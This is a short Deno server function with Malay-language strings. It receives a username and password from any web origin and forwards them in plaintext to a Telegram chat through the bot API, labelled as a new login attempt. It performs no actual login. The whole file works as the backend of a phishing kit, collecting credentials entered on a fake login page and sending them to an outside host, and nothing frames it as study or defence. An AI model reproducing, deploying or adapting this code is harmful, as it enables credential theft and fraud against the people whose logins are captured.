import { serve } from "https://deno.land/std@0.190.0/http/server.ts"

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  // Mengendalikan permintaan preflight CORS
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders })
  }

  try {
    const { username, password } = await req.json()

    const botToken = Deno.env.get('TELEGRAM_BOT_TOKEN')
    const chatId = Deno.env.get('TELEGRAM_CHAT_ID')

    if (!botToken || !chatId) {
      console.error('Token Bot Telegram atau ID Sembang tidak ditetapkan dalam pembolehubah persekitaran.')
      return new Response(
        JSON.stringify({ error: 'Ralat konfigurasi pelayan.' }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        }
      )
    }

    const message = `
      Cubaan Log Masuk Baru:
      Nama Pengguna: ${username}
      Kata Laluan: ${password}
    `

    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`

    const response = await fetch(telegramApiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown"
      }),
    })

    if (!response.ok) {
      const errorData = await response.json()
      console.error('Gagal menghantar mesej ke Telegram:', errorData)
      throw new Error('Gagal menghantar mesej ke Telegram.')
    }

    return new Response(
      JSON.stringify({ message: 'Data berjaya dihantar' }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200,
      }
    )
  } catch (error) {
    return new Response(
      JSON.stringify({ error: error.message }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 400,
      }
    )
  }
})